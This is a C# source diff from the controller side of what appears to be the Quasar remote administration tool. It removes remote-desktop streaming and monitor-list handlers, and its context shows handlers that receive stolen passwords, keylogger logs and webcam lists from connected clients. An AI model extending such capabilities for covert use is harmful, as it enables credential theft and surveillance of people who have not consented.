@@ -4,7 +4,6 @@ using System.Linq;
 using System.Drawing;
 using System.Threading;
 using Quasar.Common.Messages;
-using Quasar.Common.Video.Codecs;
 using xServer.Core.Data;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
@@ -40,39 +39,6 @@ namespace xServer.Core.Commands
 
             if (client.Value != null && client.Value.FrmPass != null)
                 client.Value.FrmPass.AddPasswords(lst.ToArray(), userAtPc);
-        }
-        public static void HandleGetDesktopResponse(Client client, GetDesktopResponse packet)
-        {
-            if (client.Value == null 
-                || client.Value.FrmRdp == null 
-                || client.Value.FrmRdp.IsDisposed 
-                || client.Value.FrmRdp.Disposing)
-                return;
-
-            if (packet.Image == null)
-                return;
-
-            if (client.Value.StreamCodec == null)
-                client.Value.StreamCodec = new UnsafeStreamCodec(packet.Quality, packet.Monitor, packet.Resolution);
-
-            if (client.Value.StreamCodec.ImageQuality != packet.Quality || client.Value.StreamCodec.Monitor != packet.Monitor
-                || client.Value.StreamCodec.Resolution != packet.Resolution)
-            {
-                if (client.Value.StreamCodec != null)
-                    client.Value.StreamCodec.Dispose();
-
-                client.Value.StreamCodec = new UnsafeStreamCodec(packet.Quality, packet.Monitor, packet.Resolution);
-            }
-
-            using (MemoryStream ms = new MemoryStream(packet.Image))
-            {
-                client.Value.FrmRdp.UpdateImage(client.Value.StreamCodec.DecodeData(ms), true);
-            }
-
-            packet.Image = null;
-
-            if (client.Value != null && client.Value.FrmRdp != null && client.Value.FrmRdp.IsStarted)
-                client.Send(new GetDesktop {Quality = packet.Quality, Monitor = packet.Monitor});
         }
 
         public static void HandleGetProcessesResponse(Client client, GetProcessesResponse packet)
@@ -172,14 +138,6 @@ namespace xServer.Core.Commands
                     client.Value.FrmKl.SetGetLogsEnabled(true);
                 }
             }
-        }
-
-        public static void HandleGetMonitorsResponse(Client client, GetMonitorsResponse packet)
-        {
-            if (client.Value == null || client.Value.FrmRdp == null)
-                return;
-
-            client.Value.FrmRdp.AddMonitors(packet.Number);
         }
 
         public static void HandleGetWebcamsResponse(Client client, GetWebcamsResponse packet)
